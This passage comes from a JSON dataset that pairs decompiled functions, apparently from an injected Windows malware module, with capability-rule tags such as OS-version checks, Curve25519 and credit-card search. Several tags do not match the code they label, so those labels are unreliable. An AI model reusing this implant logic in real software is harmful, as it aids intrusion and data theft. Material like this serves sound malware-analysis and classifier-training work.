0;\n                                }\n                                puVar7 = puVar7 + iVar5;\n                                var_14h = var_14h + -1;\n                            } while (var_14h != 0);\n                        }\n                        var_ch = var_ch + 1;\n                    } while (var_ch < 8);\n                    var_10h = var_10h + 1;\n                } while (var_10h < iVar5);\n            }\n            iVar4 = iVar4 + -1;\n            if (iVar4 < in_EAX) {\n                puVar7 = iVar4 + s2;\n                iVar4 = in_EAX - iVar4;\n                puVar8 = puVar3;\n                do {\n                    uVar1 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    *puVar7 = puVar7[puVar3 - s2] ^ uVar1;\n                    puVar7 = puVar7 + 1;\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            (*_sym.imp.msvcrt.dll_free)(puVar3);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 805
    },
    "2002388a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002388a(uint8_t *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    uint var_200h;\n    uint var_1fch;\n    \n    if (10 < arg_ch) {\n        uVar6 = 0;\n        iVar7 = 0;\n        puVar3 = arg_8h;\n        do {\n            puVar5 = puVar3;\n            uVar1 = *puVar5;\n            if (uVar1 < 0x21) {\n                return 0;\n            }\n            if (0x7f < uVar1) {\n                return 0;\n            }\n            uVar6 = uVar6 + uVar1;\n            iVar7 = iVar7 + 1;\n            puVar3 = puVar5 + 1;\n        } while (iVar7 < 8);\n        if (0x200 < arg_ch - 10) {\n            arg_ch = 0x20a;\n        }\n        if (((puVar5[1] == uVar6 / 0x1a + 0x41) && (puVar5[2] == 0x7a - uVar6 % 0x1a)) &&\n           (iVar7 = fcn.2000140f(arg_8h + 10, &var_200h, arg_ch - 10),  pcVar2 = _sym.imp.WS2_32.dll_ntohl,  iVar7 == 8)\n           ) {\n            iVar7 = 0;\n            do {\n                puVar3 = &var_200h + iVar7;\n                *puVar3 = *puVar3 ^ puVar3[arg_8h - &var_200h];\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 8);\n            uVar4 = (*_sym.imp.WS2_32.dll_ntohl)(var_200h);\n            *arg_10h = uVar4;\n            uVar4 = (*pcVar2)(var_1fch);\n            arg_10h[1] = uVar4;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 528
    },
    "2000140f": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2000140f(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint s;\n    uint var_e1h;\n    uint var_ddh;\n    uint var_cfh;\n    char acStack207 [32];\n    char acStack175 [159];\n    int32_t s1;\n    uint s2;\n    uint var_4h;\n    \n    iVar4 = 0;\n    s1 = 0;\n    sub.ntdll.dll_memset(&s, 0x80, 0xff);\n    iVar2 = 0x41;\n    do {\n        *(&s + iVar2) = iVar2 + -0x41;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x5b);\n    iVar2 = 0x61;\n    do {\n        *(&s + iVar2) = iVar2 + -0x47;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x7b);\n    iVar2 = 0x30;\n    do {\n        *(&s + iVar2) = iVar2 + '\\x04';\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x3a);\n    uVar3 = arg_10h & 0x80000003;\n    var_e1h._0_1_ = 0x3e;\n    var_ddh._0_1_ = 0x3f;\n    var_cfh._0_1_ = 0;\n    if (uVar3 < 0) {\n        uVar3 = (uVar3 - 1 | 0xfffffffc) + 1;\n    }\n    if (uVar3 == 0) {\n        if (0 < arg_10h) {\n            do {\n                iVar2 = 0;\n                do {\n                    puVar1 = &var_4h + iVar2;\n                    iVar2 = iVar2 + 1;\n                    *puVar1 = *(&s + puVar1[(arg_8h - &var_4h) + iVar4]);\n                } while (iVar2 < 4);\n                s2._0_1_ = var_4h._1_1_ >> 4 | var_4h << 2;\n                s2._2_1_ = var_4h._2_1_ << 6 | var_4h._3_1_;\n                s2._1_1_ = var_4h._2_1_ >> 2 | var_4h._1_1_ << 4;\n                if (*(iVar4 + 2 + arg_8h) == '=') {\n                    iVar2 = 1;\n                }\n                else {\n                    iVar2 = (*(iVar4 + 3 + arg_8h) != '=') + 2;\n                }\n                sub.ntdll.dll_memcpy(s1 + arg_ch, &s2, iVar2);\n                s1 = s1 + iVar2;\n                iVar4 = iVar4 + 4;\n            } while (iVar4 < arg_10h);\n        }\n        *(s1 + arg_ch) = 0;\n    }\n    else {\n        s1 = -1;\n    }\n    return s1;\n}\n",
        "token_count": 754
    },
    "200253cb": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200253cb(int32_t arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        return;\n    }\n    uVar3 = *(arg_8h + 0x10) + arg_10h * 8;\n    if (uVar3 < *(arg_8h + 0x10)) {\n        *(arg_8h + 0x14) = *(arg_8h + 0x14) + 1;\n    }\n    *(arg_8h + 0x14) = *(arg_8h + 0x14) + (arg_10h >> 0x1d);\n    uVar5 = *(arg_8h + 0x58);\n    *(arg_8h + 0x10) = uVar3;\n    if (uVar5 != 0) {\n        iVar1 = arg_8h + 0x18;\n        uVar3 = uVar5 + arg_10h;\n        iVar2 = uVar5 >> 2;\n        uVar5 = uVar5 & 3;\n        if (uVar3 < 0x40) {\n            *(arg_8h + 0x58) = uVar3;\n            if (uVar5 + arg_10h < 4) {\n                puVar6 = iVar1 + iVar2 * 4;\n                uVar3 = *puVar6;\n                if (uVar5 == 0) {\n                    uVar3 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    arg_10h = arg_10h - 1;\n                    if (arg_10h == 0) goto code_r0x2002551a;\ncode_r0x20025508:\n                    uVar3 = uVar3 | *arg_ch << 8;\n                    arg_ch = arg_ch + 1;\n                    if (arg_10h == 1) goto code_r0x2002551a;\n                }\n                else {\n                    if (uVar5 == 1) goto code_r0x20025508;\n                    if (uVar5 != 2) goto code_r0x2002551a;\n                }\n                uVar3 = uVar3 | *arg_ch << 0x10;\ncode_r0x2002551a:\n                *puVar6 = uVar3;\n                return;\n            }\n            uVar4 = uVar3 & 3;\n            uVar7 = *(iVar1 + iVar2 * 4);\n            if (uVar5 == 0) {\n                uVar7 = *arg_ch;\n                arg_ch = arg_ch + 1;\ncode_r0x20025546:\n                uVar7 = uVar7 | *arg_ch << 8;\n                arg_ch = arg_ch + 1;\ncode_r0x2002554d:\n                uVar7 = uVar7 | *arg_ch << 0x10;\n                arg_ch = arg_ch + 1;\ncode_r0x20025556:\n                uVar7 = uVar7 | *arg_ch << 0x18;\n                arg_ch = arg_ch + 1;\n            }\n            else {\n                if (uVar5 == 1) goto code_r0x20025546;\n                if (uVar5 == 2) goto code_r0x2002554d;\n                if (uVar5 == 3) goto code_r0x20025556;\n            }\n            *(iVar1 + iVar2 * 4) = uVar7;\n            while (iVar2 = iVar2 + 1,  iVar2 < uVar3 >> 2) {\n                uVar5 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                *(iVar1 + iVar2 * 4) = uVar5;\n            }\n            if (uVar4 == 0) {\n                return;\n            }\n            uVar3 = 0;\n            puVar8 = arg_ch + uVar4;\n            if (uVar4 != 1) {\n                if (uVar4 != 2) {\n                    if (uVar4 != 3) goto code_r0x200255b1;\n                    puVar8 = puVar8 + -1;\n                    uVar3 = *puVar8 << 0x10;\n                }\n                puVar8 = puVar8 + -1;\n                uVar3 = uVar3 | *puVar8 << 8;\n            }\n            uVar3 = uVar3 | puVar8[-1];\ncode_r0x200255b1:\n            *(iVar1 + iVar2 * 4) = uVar3;\n            return;\n        }\n        puVar6 = iVar1 + iVar2 * 4;\n        uVar3 = *puVar6;\n        if (uVar5 == 0) {\n            uVar3 = *arg_ch;\n            arg_ch = arg_ch + 1;\ncode_r0x20025440:\n            uVar3 = uVar3 | *arg_ch << 8;\n            arg_ch = arg_ch + 1;\ncode_r0x20025447:\n            uVar3 = uVar3 | *arg_ch << 0x10;\n            arg_ch = arg_ch + 1;\ncode_r0x20025450:\n            uVar3 = uVar3 | *arg_ch << 0x18;\n            arg_ch = arg_ch + 1;\n        }\n        else {\n            if (uVar5 == 1) goto code_r0x20025440;\n            if (uVar5 == 2) goto code_r0x20025447;\n            if (uVar5 == 3) goto code_r0x20025450;\n        }\n        *puVar6 = uVar3;\n        while (iVar2 = iVar2 + 1,  iVar2 < 0x10) {\n            uVar3 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            *(arg_8h + 0x18 + iVar2 * 4) = uVar3;\n        }\n        fcn.20024a91(arg_8h, arg_8h + 0x18, 1);\n        iVar1 = *(arg_8h + 0x58);\n        *(arg_8h + 0x58) = 0;\n        arg_10h = (arg_10h - 0x40) + iVar1;\n    }\n    if (arg_10h >> 6 != 0) {\n        fcn.20024a91(arg_8h, arg_ch, arg_10h >> 6);\n        arg_ch = arg_ch + (arg_10h & 0xffffffc0);\n        arg_10h = arg_10h - (arg_10h & 0xffffffc0);\n    }\n    if (arg_10h == 0) {\n        return;\n    }\n    *(arg_8h + 0x58) = arg_10h;\n    uVar3 = arg_10h & 3;\n    puVar6 = arg_8h + 0x18;\n    for (arg_10h = arg_10h >> 2; arg_10h != 0; arg_10h = arg_10h - 1) {\n        uVar5 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        *puVar6 = uVar5;\n        puVar6 = puVar6 + 1;\n    }\n    puVar8 = arg_ch + uVar3;\n    if (uVar3 != 1) {\n        if (uVar3 != 2) {\n            if (uVar3 != 3) goto code_r0x200255fe;\n            puVar8 = puVar8 + -1;\n            arg_10h = *puVar8 << 0x10;\n        }\n        puVar8 = puVar8 + -1;\n        arg_10h = arg_10h | *puVar8 << 8;\n    }\n    arg_10h = arg_10h | puVar8[-1];\ncode_r0x200255fe:\n    *puVar6 = arg_10h;\n    return;\n}\n",
        "token_count": 1859
    },
    "20025ce5": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20025ce5(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t *arg_10h_00;\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t **arg_8h_00;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t **ppiVar8;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    int32_t *piVar13;\n    uint *puVar14;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    fcn.20025c2c(arg_14h);\n    arg_8h_00 = fcn.20025c4b(arg_14h);\n    if ((arg_8h_00 != NULL) && (iVar6 = fcn.2002466f(arg_8h_00, arg_ch),  iVar6 != 0)) {\n        arg_10h_00 = arg_10h + 6;\n        iVar6 = arg_10h[7];\n        iVar7 = *arg_10h + (*arg_10h >> 0x1f & 0x1fU) >> 5;\n        if ((iVar7 == 0) || (iVar6 == 0)) {\n            arg_8h_00[1] = NULL;\n            return 1;\n        }\n        piVar13 = iVar6 + 1 + iVar7;\n        ppiVar8 = arg_8h_00;\n        if (arg_8h_00[2] < piVar13) {\n            ppiVar8 = fcn.2002456e(arg_8h_00, piVar13);\n        }\n        if (ppiVar8 != NULL) {\n            piVar9 = arg_8h;\n            if (arg_8h[2] < piVar13) {\n                piVar9 = fcn.2002456e(arg_8h, piVar13);\n            }\n            if (piVar9 != NULL) {\n                arg_8h_00[3] = arg_10h[9] ^ *(arg_ch + 0xc);\n                iVar2 = *arg_10h_00;\n                piVar9 = *arg_8h_00;\n                puVar12 = piVar9 + iVar6;\n                for (piVar10 = arg_8h_00[1]; piVar10 < piVar13; piVar10 = piVar10 + 1) {\n                    (*arg_8h_00)[piVar10] = 0;\n                }\n                arg_8h_00[1] = piVar13;\n                iVar15 = arg_10h[0x10];\n                var_4h = iVar6;\n                if (0 < iVar6) {\n                    do {\n                        uVar11 = fcn.200276fc(piVar9, iVar2, iVar6, *piVar9 * iVar15);\n                        *puVar12 = *puVar12 + uVar11;\n                        puVar16 = puVar12 + 1;\n                        piVar9 = piVar9 + 1;\n                        if ((*puVar12 < uVar11) && (*puVar16 = *puVar16 + 1,  *puVar16 == 0)) {\n                            puVar1 = puVar12 + 2;\n                            *puVar1 = *puVar1 + 1;\n                            if (*puVar1 == 0) {\n                                for (puVar12 = puVar12 + 3; *puVar12 = *puVar12 + 1,  *puVar12 == 0;\n                                    puVar12 = puVar12 + 1) {\n                                }\n                            }\n                        }\n                        var_4h = var_4h + -1;\n                        puVar12 = puVar16;\n                    } while (var_4h != 0);\n                }\n                iVar6 = 0;\n                if (0 < arg_8h_00[1]) {\n                    piVar13 = *arg_8h_00 + arg_8h_00[1] + -1;\n                    do {\n                        iVar2 = *piVar13;\n                        piVar13 = piVar13 + -1;\n                        if (iVar2 != 0) break;\n                        arg_8h_00[1] = arg_8h_00[1] + -1;\n                    } while (0 < arg_8h_00[1]);\n                }\n                iVar2 = *arg_8h;\n                arg_8h[3] = arg_8h_00[3];\n                piVar13 = *arg_8h_00 + iVar7;\n                if (arg_8h_00[1] < iVar7) {\n                    iVar7 = 0;\n                }\n                else {\n                    iVar7 = arg_8h_00[1] - iVar7;\n                }\n                arg_8h[1] = iVar7;\n                if (0 < iVar7 + -4) {\n                    piVar9 = iVar2 + 0xc;\n                    iVar15 = (iVar7 - 5U >> 2) + 1;\n                    piVar10 = piVar13 + 2;\n                    iVar6 = iVar15 * 4;\n                    do {\n                        iVar3 = *piVar10;\n                        iVar4 = piVar10[1];\n                        iVar5 = piVar10[-2];\n                        piVar9[-2] = piVar10[-1];\n                        piVar9[-3] = iVar5;\n                        *((iVar2 - piVar13) + piVar10) = iVar3;\n                        *piVar9 = iVar4;\n                        piVar10 = piVar10 + 4;\n                        piVar9 = piVar9 + 4;\n                        iVar15 = iVar15 + -1;\n                    } while (iVar15 != 0);\n                }\n                if (iVar6 < iVar7) {\n                    puVar14 = iVar2 + iVar6 * 4;\n                    iVar7 = iVar7 - iVar6;\n                    do {\n                        *puVar14 = *((piVar13 - iVar2) + puVar14);\n                        puVar14 = puVar14 + 1;\n                        iVar7 = iVar7 + -1;\n                    } while (iVar7 != 0);\n                }\n                iVar6 = fcn.20024882(arg_8h, arg_10h_00);\n                if (-1 < iVar6) {\n                    fcn.200274a9(arg_8h, arg_8h, arg_10h_00);\n                }\n                var_10h = 1;\n            }\n        }\n    }\n    fcn.20025c80(arg_14h);\n    return var_10h;\n}\n",
        "token_count": 1574
    },
    "2001396b": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint * fcn.2001396b(uint32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    puVar2 = (*_sym.imp.msvcrt.dll_malloc)(0xc);\n    if (puVar2 != NULL) {\n        sub.ntdll.dll_memset(puVar2, 0, 0xc);\n        puVar2[1] = param_1;\n        puVar2[2] = param_2;\n        fcn.20001567(0x20046ff0);\n        puVar1 = ((param_1 >> 5) + param_2 & 0x3f) * 4 + 0x20046ef0;\n        *puVar2 = *puVar1;\n        *puVar1 = puVar2;\n        fcn.2000157d(0x20046ff0);\n        puVar2 = 0x1;\n    }\n    return puVar2;\n}\n",
        "token_count": 218
    },
    "200139c9": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200139c9(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.20001567(0x20046ff0);\n    puVar1 = ((arg_8h >> 5) + arg_ch & 0x3f) * 4 + 0x20046ef0;\n    puVar2 = *puVar1;\n    puVar4 = NULL;\n    do {\n        puVar3 = puVar2;\n        if (puVar3 == NULL) {\ncode_r0x20013a2f:\n            fcn.2000157d(0x20046ff0);\n            return var_4h;\n        }\n        if ((puVar3[1] == arg_8h) && (puVar3[2] == arg_ch)) {\n            if (puVar4 == NULL) {\n                *puVar1 = *puVar3;\n            }\n            else {\n                *puVar4 = *puVar3;\n            }\n            (*_sym.imp.msvcrt.dll_free)(puVar3);\n            var_4h = 1;\n            goto code_r0x20013a2f;\n        }\n        puVar2 = *puVar3;\n        puVar4 = puVar3;\n    } while( true );\n}\n",
        "token_count": 327
    },
    "20013a3e": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint fcn.20013a3e(uint32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    fcn.20001567(0x20046ff0);\n    puVar1 = *(((param_1 >> 5) + param_2 & 0x3f) * 4 + 0x20046ef0);\n    do {\n        if (puVar1 == NULL) {\ncode_r0x20013a7e:\n            fcn.2000157d(0x20046ff0);\n            return uVar2;\n        }\n        if ((puVar1[1] == param_1) && (puVar1[2] == param_2)) {\n            uVar2 = 1;\n            goto code_r0x20013a7e;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 213
    },
    "200067ca": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.200067ca(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    var_4h = 0;\n    if (arg_14h < 0x3d) {\n        uVar2 = 0x21590064;\n    }\n    else {\n        fcn.2000633e();\n        iVar1 = sym.inj_snake_Win32.dll_qm_enum(*arg_10h, arg_10h[1], &arg_14h, &var_4h);\n        if (iVar1 == 0) {\n            if (arg_14h == 0) {\n                *arg_18h = 0;\n                *arg_1ch = 0;\n            }\n            else {\n                iVar1 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, arg_14h << 6, 0);\n                if (iVar1 == 0) {\n                    uVar2 = 0x21590004;\n                    goto code_r0x20006887;\n                }\n                sub.ntdll.dll_memcpy(iVar1, var_4h, arg_14h << 6);\n                if (arg_14h != 0) {\n                    do {\n                        fcn.2000639d();\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < arg_14h);\n                }\n                *arg_18h = iVar1;\n                *arg_1ch = arg_14h << 6;\n            }\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = iVar1 + 0x191U | 0x21590000;\n        }\n    }\ncode_r0x20006887:\n    sym.inj_snake_Win32.dll_qm_free(var_4h);\n    (*_sym.imp.msvcrt.dll_free)(0);\n    return uVar2;\n}\n",
        "token_count": 477
    },
    "2000759d": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.2000759d(uint arg_8h, uint noname_1, uint *arg_10h, uint32_t arg_14h, int32_t *arg_18h, uint *arg_1ch, \n            int32_t arg_20h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = 0;\n    if (arg_14h < 0x3d) {\ncode_r0x200075b1:\n        uVar4 = 0x21590064;\n        goto code_r0x2000784c;\n    }\n    fcn.2000633e();\n    if ((arg_10h[1] == 0) && (*(arg_10h + 3) == '\\x1b')) {\n        fcn.2000902f(*arg_10h, arg_10h[2]);\n        iVar2 = fcn.20009e43(*arg_10h);\n        if (iVar2 != 0) {\n            uVar4 = 0x21590207;\n            goto code_r0x2000784c;\n        }\n    }\n    if ((*(arg_10h + 3) & 0x10) != 0) {\n        fcn.20006a7e(*arg_10h, arg_10h[1], arg_10h[2]);\n    }\n    if ((*(arg_10h + 3) & 1) == 0) {\n        puVar5 = arg_10h + 2;\n    }\n    else {\n        puVar5 = NULL;\n    }\n    iVar2 = sym.inj_snake_Win32.dll_qm_find_first(*arg_10h, arg_10h[1], puVar5, &var_50h);\n    if (iVar2 == 0) {\n        arg_14h = *(arg_10h + 0x11);\n        if (arg_14h == 0) {\n            arg_14h = var_20h - *(arg_10h + 0xd);\n        }\n        if (arg_20h == 0) {\n            if ((*(arg_10h + 3) & 4) == 0) {\n                if (var_20h == 0) {\n                    *arg_18h = 0;\n                    *arg_1ch = 0;\n                }\n                else {\n                    iVar2 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, arg_14h, 0);\n                    *arg_18h = iVar2;\n                    if (iVar2 == 0) {\ncode_r0x200076ca:\n                        uVar4 = 0x21590004;\n                        goto code_r0x2000784c;\n                    }\n                    iVar2 = sym.inj_snake_Win32.dll_qm_read\n                                      (*arg_10h, arg_10h[1], var_4ch, *(arg_10h + 0xd), iVar2, arg_14h, &var_10h);\n                    if (iVar2 != 0) goto code_r0x2000762a;\n                    *arg_1ch = var_10h;\n                }\n            }\n            else {\n                iVar2 = sym.inj_snake_Win32.dll_tr_alloc(arg_8h, 0x40, 0);\n                *arg_18h = iVar2;\n                if (iVar2 == 0) {\n                    uVar4 = 0x21590004;\n                    goto code_r0x2000784c;\n                }\n                fcn.2000639d();\n                sub.ntdll.dll_memcpy(*arg_18h, &var_50h, 0x40);\n                fcn.20005391();\n                *arg_1ch = 0x40;\n            }\n        }\n        else {\n            if ((*(arg_10h + 3) & 6) != 0) {\n                fcn.2000639d();\n                uVar4 = sym.inj_snake_Win32.dll_tr_write_pipe(arg_8h);\n                if (uVar4 != 0) goto code_r0x2000784c;\n                fcn.20005391();\n            }\n            if ((*(arg_10h + 3) & 4) == 0) {\n                uVar4 = *(arg_10h + 0x19);\n                if ((uVar4 == 0) || (uVar4 < *(arg_10h + 0x15))) goto code_r0x200075b1;\n                var_8h = (*_sym.imp.msvcrt.dll_malloc)(uVar4);\n                if (var_8h == 0) goto code_r0x200076ca;\n                var_ch = 0;\n                if (arg_14h != 0) {\n                    do {\n                        uVar4 = *(arg_10h + 0x19);\n                        if (uVar4 < *(arg_10h + 0x15) || uVar4 == *(arg_10h + 0x15)) {\n                            uVar3 = fcn.200018bf();\n                            var_4h = uVar3 % ((*(arg_10h + 0x15) - uVar4) + 1) + uVar4;\n                        }\n                        else {\n                            iVar2 = *(arg_10h + 0x15);\n                            uVar3 = fcn.200018bf();\n                            var_4h = uVar3 % ((uVar4 - iVar2) + 1) + iVar2;\n                        }\n                        if ((var_4h == 0) || (uVar4 < var_4h)) {\n                            uVar4 = 0x215901f6;\n                            goto code_r0x2000784c;\n                        }\n                        iVar2 = sym.inj_snake_Win32.dll_qm_read\n                                          (*arg_10h, arg_10h[1], var_4ch, *(arg_10h + 0xd) + var_ch, var_8h, var_4h, \n                                           &var_4h);\n                        if (iVar2 != 0) goto code_r0x2000762a;\n                        uVar4 = sym.inj_snake_Win32.dll_tr_write_pipe(arg_8h);\n                        if (uVar4 != 0) goto code_r0x2000784c;\n                        var_ch = var_ch + var_4h;\n                    } while (var_ch < arg_14h);\n                }\n                uVar4 = sym.inj_snake_Win32.dll_tr_write_pipe(arg_8h);\n                if (uVar4 != 0) goto code_r0x2000784c;\n            }\n        }\n        if ((*(arg_10h + 3) & 8) != 0) {\n            iVar2 = sym.inj_snake_Win32.dll_qm_rm(*arg_10h, arg_10h[1], var_4ch);\n            if (iVar2 != 0) goto code_r0x2000762a;\n        }\n        uVar4 = 0;\n    }\n    else {\ncode_r0x2000762a:\n        uVar4 = iVar2 + 0x191U | 0x21590000;\n    }\ncode_r0x2000784c:\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(var_8h);\n    (*pcVar1)(0);\n    return uVar4;\n}\n",
        "token_count": 1720
    },
    "2000786a": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000786a(uint noname_0, uint noname_1, uint *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_40h;\n    uint var_3ch;\n    \n    if (arg_14h < 0x3d) {\n        uVar2 = 0x21590064;\n        goto code_r0x200078dc;\n    }\n    fcn.2000633e();\n    if ((*(arg_10h + 3) & 1) == 0) {\n        iVar1 = sym.inj_snake_Win32.dll_qm_find_first(*arg_10h, arg_10h[1], arg_10h + 2, &var_40h);\n        if (iVar1 == 0) {\n            iVar1 = sym.inj_snake_Win32.dll_qm_rm(*arg_10h, arg_10h[1], var_3ch);\n            goto code_r0x200078c5;\n        }\n    }\n    else {\n        iVar1 = fcn.20006a7e(*arg_10h, arg_10h[1], arg_10h[2] + 1);\ncode_r0x200078c5:\n        if (iVar1 == 0) {\n            uVar2 = 0;\n            goto code_r0x200078dc;\n        }\n    }\n    uVar2 = iVar1 + 0x191U | 0x21590000;\ncode_r0x200078dc:\n    (*_sym.imp.msvcrt.dll_free)(0);\n    return uVar2;\n}\n",
        "token_count": 372
    },
    "20001ac0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20001ac0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    \n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    lpVersionInformation = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetSidLengthRequired)(1);\n        iVar3 = (*_sym.imp.msvcrt.dll_malloc)(iVar1 + 0x24);\n        *arg_8h = iVar3;\n        if (iVar3 == 0) {\n            return 0xffffffff;\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar3, 1);\n        if ((iVar3 != 0) && (iVar3 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(*arg_8h, 1, 0, 0),  iVar3 != 0))\n        {\n            if (var_90h != 6) {\n                return 0;\n            }\n            iVar3 = *arg_8h;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeAcl)(iVar3 + 0x14, iVar1 + 0x10, 2);\n            if (iVar1 != 0) {\n                *(iVar3 + 0x18) = 1;\n                *(iVar3 + 0x20) = 0;\n                *(iVar3 + 0x1c) = 0x11;\n                *(iVar3 + 0x1d) = 0;\n                *(iVar3 + 0x1e) = 0xc;\n                iVar1 = (*_sym.imp.ADVAPI32.dll_InitializeSid)(iVar3 + 0x24, 0x20034108, 1);\n                if (iVar1 != 0) {\n                    puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(iVar3 + 0x24, 0);\n                    *puVar4 = 0x1000;\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorSacl)(*arg_8h, 1, iVar3 + 0x14, 0);\n                    if (iVar1 != 0) {\n                        return 0;\n                    }\n                }\n            }\n        }\n        (*_sym.imp.msvcrt.dll_free)(*arg_8h);\n        *arg_8h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return uVar2;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    return uVar2;\n}\n",
        "token_count": 644
    },
    "20016816": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20016816(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_ch != 6) {\n        uVar1 = fcn.20011d47(*(arg_8h + 0xc), arg_ch, arg_10h, arg_14h, 0);\n        return uVar1;\n    }\n    if (arg_14h == 0xc) {\n        sub.ntdll.dll_memcpy(arg_8h + 0x118, arg_10h, 0xc);\n        return 0;\n    }\n    return 0x21590064;\n}\n",
        "token_count": 157
    },
    "200198ea": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
